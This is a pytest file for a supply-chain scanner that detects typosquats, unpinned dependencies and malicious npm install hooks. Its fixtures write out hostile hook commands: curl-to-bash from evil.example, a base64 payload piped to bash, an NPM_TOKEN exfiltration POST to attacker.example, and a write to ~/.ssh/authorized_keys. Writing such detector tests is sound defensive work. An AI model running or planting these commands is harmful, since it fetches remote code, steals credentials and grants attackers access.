"""Tests for supply-chain manifest analysis: typosquats, unpinned versions, install scripts."""

from __future__ import annotations

import json

from argus.scanner.supplychain import _levenshtein_le1, audit_supply_chain


def test_levenshtein_detects_substitution():
    assert _levenshtein_le1("lodahs", "lodash") is True


def test_levenshtein_detects_transposition():
    # classic typosquat: adjacent-character swap, not a plain substitution
    assert _levenshtein_le1("reqeust", "request") is True


def test_levenshtein_detects_insertion_deletion():
    assert _levenshtein_le1("expres", "express") is True
    assert _levenshtein_le1("expresss", "express") is True


def test_levenshtein_rejects_identical_and_distant():
    assert _levenshtein_le1("express", "express") is False
    assert _levenshtein_le1("react", "vue") is False
    assert _levenshtein_le1("totally-unrelated-name", "express") is False


def test_npm_manifest_flags_typosquat_unpinned_and_install_script(tmp_path):
    manifest = {
        "name": "demo-app",
        "dependencies": {
            "reqeust": "^1.0.0",       # typosquat of 'request'
            "left-pad": "*",           # fully unpinned
        },
        "scripts": {
            "postinstall": "curl http://evil.example/payload.sh | bash",
        },
    }
    (tmp_path / "package.json").write_text(json.dumps(manifest), encoding="utf-8")

    findings, notes = audit_supply_chain(tmp_path, ["package.json"])
    titles = [f.title for f in findings]
    detectors = {f.detector for f in findings}

    assert any("reqeust" in t for t in titles)
    assert any("left-pad" in t for t in titles)
    assert any("postinstall" in t for t in titles)
    assert "supplychain:typosquat" in detectors
    assert "supplychain:unpinned" in detectors
    assert "supplychain:install-script" in detectors
    install_finding = next(f for f in findings if f.detector == "supplychain:install-script")
    assert install_finding.severity.value == "CRITICAL"


def test_npm_manifest_floating_range_only_flagged_without_lockfile(tmp_path):
    manifest = {"dependencies": {"express": "^4.18.0"}}
    (tmp_path / "package.json").write_text(json.dumps(manifest), encoding="utf-8")

    # No lockfile: the floating range should be flagged.
    findings, _ = audit_supply_chain(tmp_path, ["package.json"])
    assert any(f.detector == "supplychain:unpinned" for f in findings)

    # With a lockfile present, the same floating range is NOT flagged (the lockfile
    # pins the actually-installed version regardless of the package.json range).
    (tmp_path / "package-lock.json").write_text("{}", encoding="utf-8")
    findings2, _ = audit_supply_chain(tmp_path, ["package.json"])
    assert not any(f.detector == "supplychain:unpinned" for f in findings2)


def test_requirements_txt_flags_typosquat_and_unpinned(tmp_path):
    (tmp_path / "requirements.txt").write_text(
        "flaks==2.0.1\nrequests\nnumpy==1.26.0\n", encoding="utf-8"
    )
    findings, _ = audit_supply_chain(tmp_path, ["requirements.txt"])
    titles = [f.title for f in findings]
    assert any("flaks" in t for t in titles)          # typosquat of 'flask'
    assert any("requests" in t for t in titles)        # unpinned (no ==)
    assert not any("numpy" in t for t in titles)       # pinned, not a typosquat


def test_audit_supply_chain_ignores_unknown_manifests(tmp_path):
    findings, notes = audit_supply_chain(tmp_path, ["go.mod"])
    assert findings == []


# ----- behavioral install-script analysis (roadmap v0.4.5) -----

def _manifest_with_script(tmp_path, hook: str, cmd: str):
    manifest = {"name": "demo-app", "scripts": {hook: cmd}}
    (tmp_path / "package.json").write_text(json.dumps(manifest), encoding="utf-8")
    return audit_supply_chain(tmp_path, ["package.json"])


def test_flags_download_then_execute_binary(tmp_path):
    findings, _ = _manifest_with_script(
        tmp_path, "postinstall",
        "curl -o payload http://evil.example/x && chmod +x payload && ./payload",
    )
    titles = [f.title for f in findings]
    assert any("downloads and executes a binary" in t for t in titles)


def test_does_not_flag_download_then_execute_without_all_three_steps(tmp_path):
    # only a download + chmod, no execution -- shouldn't trip the download-exec check
    findings, _ = _manifest_with_script(
        tmp_path, "postinstall", "curl -o payload http://example.com/x && chmod +x payload",
    )
    titles = [f.title for f in findings]
    assert not any("downloads and executes a binary" in t for t in titles)


def test_flags_base64_decoded_payload_piped_to_shell(tmp_path):
    findings, _ = _manifest_with_script(
        tmp_path, "preinstall", "echo Y3VybCBldmlsLmV4YW1wbGU= | base64 -d | bash",
    )
    titles = [f.title for f in findings]
    assert any("Obfuscated payload" in t for t in titles)


def test_flags_env_secret_exfiltration(tmp_path):
    findings, _ = _manifest_with_script(
        tmp_path, "postinstall",
        "curl -X POST -d \"token=$NPM_TOKEN\" http://attacker.example/collect",
    )
    titles = [f.title for f in findings]
    assert any("exfiltrate secrets" in t for t in titles)


def test_does_not_flag_network_call_without_secret_env_var(tmp_path):
    findings, _ = _manifest_with_script(
        tmp_path, "postinstall", "curl -X POST -d \"status=ok\" http://example.com/telemetry",
    )
    titles = [f.title for f in findings]
    assert not any("exfiltrate secrets" in t for t in titles)


def test_flags_sensitive_path_write(tmp_path):
    findings, _ = _manifest_with_script(
        tmp_path, "postinstall", "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
    )
    titles = [f.title for f in findings]
    assert any("sensitive path" in t for t in titles)


def test_install_hook_beyond_pre_post_install_is_checked(tmp_path):
    # preuninstall/postuninstall weren't checked at all before v0.4.5
    findings, _ = _manifest_with_script(
        tmp_path, "preuninstall", "curl http://evil.example/cleanup.sh | sh",
    )
    assert any(f.detector == "supplychain:install-script" for f in findings)


def test_benign_install_script_not_flagged(tmp_path):
    findings, _ = _manifest_with_script(tmp_path, "postinstall", "node-gyp rebuild")
    assert not any(f.detector == "supplychain:install-script" for f in findings)
